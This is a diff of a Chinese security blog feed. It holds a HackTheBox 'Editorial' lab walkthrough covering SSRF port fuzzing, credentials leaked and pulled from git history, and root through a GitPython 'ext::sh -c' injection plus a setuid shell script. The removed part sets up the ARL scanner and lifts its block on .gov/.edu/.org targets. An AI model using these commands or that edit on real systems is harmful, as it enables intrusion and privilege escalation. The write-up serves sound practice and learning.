+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021214406645.png" class title="image-20241021214406645">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021213918249.png" class title="image-20241021213918249">
+
+<p> 当我不提供任何图片时，直接让目标访问 Python Web服务根目录，目标会读取根目录列表并存在服务器中</p>
+ <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021214926014.png" class title="image-20241021214926014">
+
+<p> 这表明目标可以读取任何有效的 URL 内容</p>
+<h2 id="SSRF内部端口识别："><a href="#SSRF内部端口识别：" class="headerlink" title="SSRF内部端口识别："></a>SSRF内部端口识别：</h2><p>通过该程序提供的 HTTP 请求功能，我尝试判断是否存在<strong>本地无法访问的服务端口</strong></p>
+<p>首先将表单信息改为127.0.0.1，端口改为80、22，这是已知的两个端口，分别提交。80端口等待了长时间才返回结果，而22端口立刻就返回了结果，结果仍然回显之前的错误图片</p>
+ <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021215635729.png" class title="image-20241021215635729">
+
+ <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021215803803.png" class title="image-20241021215803803">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021215751200.png" class title="image-20241021215751200">
+
+<p>我再次尝试请求一个不存在的端口</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022095339258.png" class title="image-20241022095339258">
+
+<p>和22端口一样很快的返回了结果，同样是之前的错误图片</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022095356826.png" class>
+
+<p><strong>接下来我尝试枚举所有端口。</strong></p>
+<p>将 HTTP 请求体中需要替换的内容使用占位符FUZZ替代，并保存在 requests.txt，使用 <code>ffuf</code> 进行SSRF fuzz</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021222128775.png" class>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u http://editorial.htb/upload-cover -request ssrf.request -w &lt;(seq 0 65535) -ac</span><br></pre></td></tr></table></figure></div>
+
+<p>扫描完毕，结果显示 5000 端口内部开放</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022101049760.png" class title="image-20241022101049760">
+
+<p>5000 端口是一个内部运行的端口，我并不知道它运行的是什么服务</p>
+<p>尝试请求 5000 端口，服务器返回了不同的结果</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022095746155.png" class title="image-20241022095746155">
+
+<p>BurpSuite全部放包，不然包被卡住，服务器不会存储读取的信息。</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022100814908.png" class title="image-20241022100814908">
+
+<p>然后读取文件，缓存时间比较短暂，因为有一个自动清理的程序在运行，一会就自动清理了</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022101125499.png" class title="image-20241022101125499">
+
+<p>将文本进行 Json 格式化</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022102238058.png" class title="image-20241022102238058">
+
+<p>服务器特别像 Flask 或 Gunicorn 等框架，根据 Json 信息，推测它可能在运行基于Python 及 Flask 构建的 Web API 应用。这个应用负责处理 HTTP 请求，并响应 JSON 格式的数据，用于处理和管理用户、版本更新等信息，<strong>接下来我尝试去抓取这些API端点信息</strong></p>
+<h3 id="API端点信息获取："><a href="#API端点信息获取：" class="headerlink" title="API端点信息获取："></a>API端点信息获取：</h3><p>依次请求各个API</p>
+<p><a class="link" href="http://127.0.0.1:5000/api/latest/metadata/messages/coupons">http://127.0.0.1:5000/api/latest/metadata/messages/coupons<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022104448557.png" class title="image-20241022104448557">
+
+<p>&#x2F;api&#x2F;latest&#x2F;metadata&#x2F;messages&#x2F;authors</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022105709117.png" class title="image-20241022105709117">
+
+<p>&#x2F;api&#x2F;latest&#x2F;metadata&#x2F;changelog</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022110151574.png" class title="image-20241022110151574">
+
+<p>在authors中，惊人地发现账户密码泄露，使用 SSH 尝试连接，登录成功</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev/dev080217_devAPI!@</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022110453419.png" class title="image-20241022110453419">
+
+<h2 id="dev-prod-用户移动："><a href="#dev-prod-用户移动：" class="headerlink" title="dev -&gt; prod 用户移动："></a>dev -&gt; prod 用户移动：</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>对内网进行基础信息枚举</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~$ sudo -l</span><br><span class="line">[sudo] password for dev: </span><br><span class="line">Sorry, user dev may not run sudo on editorial.</span><br></pre></td></tr></table></figure></div>
+
+<p>列出SUID文件，但并没有可利用提权的文件</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/libexec/polkit-agent-helper-1</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/fusermount3</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br></pre></td></tr></table></figure></div>
+
+<p>系统下存在两个用户，dev、prod</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~$ cd /home</span><br><span class="line">dev@editorial:/home$ ls</span><br><span class="line">dev  prod</span><br><span class="line">dev@editorial:/home$ ls -liah</span><br><span class="line">total 16K</span><br><span class="line">76438 drwxr-xr-x  4 root root 4.0K Jun  5 14:36 .</span><br><span class="line">    2 drwxr-xr-x 18 root root 4.0K Jun  5 14:54 ..</span><br><span class="line">79764 drwxr-x---  4 dev  dev  4.0K Oct 22 06:52 dev</span><br><span class="line">77643 drwxr-x---  5 prod prod 4.0K Jun  5 14:36 prod</span><br></pre></td></tr></table></figure></div>
+
+<p>我传入<strong>pspy64监控定时任务</strong>，发现服务器定时执行 clear.sh 脚本清理 <code>/static/uploads/.</code> 目录，这也对应了前面调用服务器发送 HTTP 请求读取信息，一会缓存就没了的情况。</p>
+<p>可惜该文件是只读文件，无法被普通用户修改</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022115252379.png" class title="image-20241022115252379">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022115654170.png" class title="image-20241022115654170">
+
+<h3 id="Git-历史记录敏感信息收集："><a href="#Git-历史记录敏感信息收集：" class="headerlink" title="Git 历史记录敏感信息收集："></a>Git 历史记录敏感信息收集：</h3><p>dev 用户路径下存在一个 apps 目录</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:/home$ cd ~</span><br><span class="line">dev@editorial:~$ ls -liah</span><br><span class="line">total 36K</span><br><span class="line">79764 drwxr-x--- 4 dev  dev  4.0K Oct 22 06:52 .</span><br><span class="line">76438 drwxr-xr-x 4 root root 4.0K Jun  5 14:36 ..</span><br><span class="line">79704 drwxrwxr-x 3 dev  dev  4.0K Jun  5 14:36 apps</span><br><span class="line">80303 lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -&gt; /dev/null</span><br><span class="line">80301 -rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout</span><br><span class="line">80256 -rw-r--r-- 1 dev  dev  3.7K Jan  6  2022 .bashrc</span><br><span class="line">79703 drwx------ 2 dev  dev  4.0K Jun  5 14:36 .cache</span><br><span class="line">  187 -rw------- 1 dev  dev    20 Oct 22 06:52 .lesshst</span><br><span class="line">80300 -rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile</span><br><span class="line">83829 -rw-r----- 1 root dev    33 Oct 22 04:06 user.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>进入该目录，发现这是一个 <code>git</code> 项目文件夹，<code>.git</code> 目录仍然存在，说明这个项目之前使用了 Git 进行版本控制。然而，当运行 git status 时，Git 显示了项目中的文件都已被删除。</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~/apps$ ls -liah</span><br><span class="line">total 12K</span><br><span class="line">79704 drwxrwxr-x 3 dev dev 4.0K Jun  5 14:36 .</span><br><span class="line">79764 drwxr-x--- 4 dev dev 4.0K Oct 22 06:52 ..</span><br><span class="line">77696 drwxr-xr-x 8 dev dev 4.0K Oct 22 06:49 .git</span><br><span class="line"></span><br><span class="line">dev@editorial:~/apps$ git status</span><br><span class="line"></span><br><span class="line">On branch master                                                                  </span><br><span class="line">Changes not staged for commit:                                                  </span><br><span class="line">  (use &quot;git add/rm &lt;file&gt;...&quot; to update what will be committed)                   </span><br><span class="line">  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)        </span><br><span class="line">  </span><br><span class="line">        deleted:    app_api/app.py                                                </span><br><span class="line">        deleted:    app_editorial/app.py                                       </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.css                 </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.css.map              </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.min.css                                         </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.min.css.map                                     </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.css                                         </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.css.map                                     </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/images/login-background.jpg</span><br><span class="line">        deleted:    app_editorial/static/images/pexels-janko-ferlic-590493.jpg</span><br><span class="line">        deleted:    app_editorial/static/images/pexels-min-an-694740.jpg</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.min.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.min.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.min.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.min.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.min.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.min.js.map</span><br><span class="line">        deleted:    app_editorial/templates/about.html</span><br><span class="line">        deleted:    app_editorial/templates/index.html</span><br><span class="line">        deleted:    app_editorial/templates/upload.html</span><br></pre></td></tr></table></figure></div>
+
+<p>Git 是一个分布式版本控制系统，它允许开发者跟踪代码库的变化，并且可以在不同版本之间切换。<code>.git</code> 目录是一个隐藏文件夹，存储了该项目的所有版本历史记录、分支信息、提交记录等。</p>
+<p><code>.git</code> 目录通常包含的内容有：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">objects/：存储着项目的所有数据对象，每一个文件的所有版本都存储为对象。</span><br><span class="line">refs/：记录了分支和标签。</span><br><span class="line">config：Git 项目的配置文件。</span><br><span class="line">HEAD：指向当前活动的分支。</span><br></pre></td></tr></table></figure></div>
+
+<p>推测开发者可能删除了项目文件，但忘记了删除 <code>.git</code> 目录，导致版本控制信息还留在系统中。这种情况下，仍然可以通过 <code>.git</code> 恢复被删除的文件或获取有用的敏感信息。</p>
+<p>查看之前的提交，寻找敏感信息，有时候开发者可能会在提交历史中留下敏感信息，比如API密钥、数据库密码，甚至是应用程序的凭据。</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~/apps$ git log --oneline</span><br><span class="line">8ad0f31 (HEAD -&gt; master) fix: bugfix in api port endpoint</span><br><span class="line">dfef9f2 change: remove debug and update api port</span><br><span class="line">b73481b change(api): downgrading prod to dev</span><br><span class="line">1e84a03 feat: create api to editorial info</span><br><span class="line">3251ec9 feat: create editorial app</span><br><span class="line"></span><br><span class="line">//git log --oneline 以简洁的方式展示Git仓库的提交历史，每个提交信息会包含一个提交的哈希值以及提交时的简要描述</span><br></pre></td></tr></table></figure></div>
+
+<p>发现提交记录中，有这样一句 <code>downgrading prod to dev</code>，这句信息表明开发者将 prod 降级为 dev，这有可能存在敏感信息，使用 <code>git diff</code> 查看代码更改的差异，定位具体更改内容</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev@editorial:~/apps$ git diff 1e84a03 b73481b</span><br><span class="line">diff --git a/app_api/app.py b/app_api/app.py</span><br><span class="line">index 61b786f..3373b14 100644</span><br><span class="line">--- a/app_api/app.py</span><br><span class="line">+++ b/app_api/app.py</span><br><span class="line">@@ -64,7 +64,7 @@ def index():</span><br><span class="line"> @app.route(api_route + &#x27;/authors/message&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line"> def api_mail_new_authors():</span><br><span class="line">     return jsonify(&#123;</span><br><span class="line">-        &#x27;template_mail_message&#x27;: &quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, &quot; + api_editorial_name + &quot; Team.&quot;</span><br><span class="line">+        &#x27;template_mail_message&#x27;: &quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, &quot; + api_editorial_name + &quot; Team.&quot;</span><br><span class="line">     &#125;) # TODO: replace dev credentials when checks pass</span><br><span class="line"> </span><br><span class="line"> # -------------------------------</span><br></pre></td></tr></table></figure></div>
+
+<p>使用 <code>git diff</code> ，在两次更改的差异中找到了密码信息</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Username: prod</span><br><span class="line">- Password: 080217_Producti0n_2023!@</span><br><span class="line">+ Username: dev</span><br><span class="line">+ Password: dev080217_devAPI!@</span><br></pre></td></tr></table></figure></div>
+
+<p>使用账号密码切换 prod 用户</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022173023570.png" class title="image-20241022173023570">
+
+<h2 id="Root-权限提升："><a href="#Root-权限提升：" class="headerlink" title="Root 权限提升："></a>Root 权限提升：</h2><p>从 <code>Dev</code> 用户切换至 <code>Prod</code> 用户，并用 <code>sudo -l </code> 列出用户具有的 <code>sudo</code> 权限，发现具备使用 root 权限运行 <code>clone_prod_change.py</code> 文件的权限</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">prod@editorial:~$ sudo -l</span><br><span class="line">[sudo] password for prod: </span><br><span class="line">Matching Defaults entries for prod on editorial:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User prod may run the following commands on editorial:</span><br><span class="line">    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</span><br></pre></td></tr></table></figure></div>
+
+<p>查看 <code>/opt/internal_apps/clone_changes/clone_prod_change.py</code> 文件，发现代码使用了 <code>gitpython</code> 库调用 <code>git</code></p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024145910846.png" class title="image-20241024145910846">
+
+<p>发现当前 <code>GitPython</code> 库版本为 3.1.29，低于 3.1.30，这个版本存在 CVE 漏洞</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024145558285.png" class title="image-20241024145558285">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024145825520.png" class title="image-20241024145825520">
+
+<p>根据官方文档，该漏洞受影响的函数是 <code>git.repo.base.Repo.clone_from</code> ，该函数的第一个参数接收一个 URL ，假如对这个参数不做检验直接传给 <code>clone_from</code> 函数，就会造成命令执行漏洞</p>
+<p>接下来我给 <code>clone_prod_change.py</code> 文件传入 <code>ext::sh -c touch% /tmp/FuXian</code></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py &quot;ext::sh -c touch% /tmp/FuXian&quot;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024150233332.png" class title="image-20241024150233332">
+
+<p>看到虽然报错，但成功创建了 <code>/tmp/FuXian</code> 目录，漏洞复现成功。</p>
+<p><strong>利用该漏洞提权</strong></p>
+<p>创建一个bash脚本，将 <code>/bin/sh</code> 复制至 <code>/tmp/a</code> ，给 <code>/tmp/a</code> 文件提升至 root 权限，并赋予 SetUID、SetGID</p>
+<p>Setuid（设置用户 ID 位）：当文件具有 setuid 权限时，无论谁执行该文件，该进程将以文件所有者的权限运行。<br>Setgid（设置组 ID 位）：当文件具有 setgid 权限时，无论谁执行该文件，该进程将以文件所属组的权限运行。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cp /bin/sh /tmp/a</span><br><span class="line">chown root:root /tmp/a</span><br><span class="line">chmod 6777 /tmp/a</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\n\ncp /bin/sh /tmp/a\nchown root:root /tmp/a\nchmod 6777 /tmp/a&#x27; &gt; /dev/shm/a.sh</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024151528414.png" class title="image-20241024151528414">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x a.sh</span><br><span class="line">sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py &quot;ext::sh -c touch% /dev/shm/a.sh&quot;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024151936910.png" class title="image-20241024151936910">
+
+<p>执行 <code>/tmp/a</code> ，<code>-p</code> 保留权限，完成 Root 提权</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024152551978.png" class title="image-20241024152551978">
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>靶机系列</category>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>综合渗透靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HackTheBox - EscapeTwo</title>
     <url>/2025/03/05/HackTheBox-EscapeTwo/</url>
     <content><![CDATA[<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221181200747.png" class title="image-20250221181200747">
@@ -808,124 +807,6 @@
       </categories>
       <tags>
         <tag>综合渗透靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>资产侦察系统灯塔ARL优化</title>
-    <url>/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/</url>
-    <content><![CDATA[<h2 id="灯塔介绍与安装"><a href="#灯塔介绍与安装" class="headerlink" title="灯塔介绍与安装"></a>灯塔介绍与安装</h2><p>灯塔一般用于自动化安全扫描，帮助发现和修复安全漏洞，适用于 Web 应用、API、安全配置等多个领域。它通过快速、全面的扫描和详细的报告，帮助开发人员、运维人员等及时了解并解决安全问题。</p>
-<p><strong>初始账号密码：</strong></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/arlpass</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207111703756.png" class title="image-20241207111703756">
-
-<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>选择灯塔魔改版下载，ARL-Puls 是基于灯塔ARL修改后的版本。相比原版，增加了OneForAll、中央<a class="link" href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">数据库<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，修改了altDns。</p>
-<p>Github地址：<a class="link" href="https://github.com/ki9mu/ARL-plus-docker">https://github.com/ki9mu/ARL-plus-docker<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p>下载上传或克隆</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ki9mu/ARL-plus-docker</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>修改域名禁止项</p>
-<p>灯塔中指定了无法扫描域名后缀 .edu .gov .org，开启 Docker 之前修改为不存在域名</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207102624762.png" class title="image-20241207102624762">
-
-<p>修改后</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207102529258.png" class title="image-20241207102529258">
-
-<p>配置 Fofa API</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207103449345.png" class title="image-20241207103449345">
-
-
-
-<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>先添加 Docker 数据卷</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker volume create --name=arl_db</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207105634491.png" class title="image-20241207105634491">
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207111459771.png" class title="image-20241207111459771">
-
-
-
-<h2 id="优化增强"><a href="#优化增强" class="headerlink" title="优化增强"></a>优化增强</h2><h3 id="子域名字典扩容"><a href="#子域名字典扩容" class="headerlink" title="子域名字典扩容"></a>子域名字典扩容</h3><p>灯塔自带的字典仅包含两万个子域名，依赖这个字典进行扫描往往会漏掉一些潜在的子域名</p>
-<p>将准备好的子域名字典复制到 arl_worker 中，使⽤如下命令：</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp domain_2w.txt ID:/code/app/dicts/domain_2w.txt</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207114224079.png" class title="image-20241207114224079">
-
-
-
-<h3 id="指纹增强"><a href="#指纹增强" class="headerlink" title="指纹增强"></a>指纹增强</h3><p>添加指纹，让灯塔拥有更强大的指纹，参考使用 ARL-Finger-ADD</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/loecho-sec/ARL-Finger-ADD</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207120427341.png" class title="image-20241207120427341">
-
-<p>脚本主要实现的功能是通过读取 finger.json 中的数据，向灯塔系统批量添加指纹信息	</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207163319548.png" class title="image-20241207163319548">
-
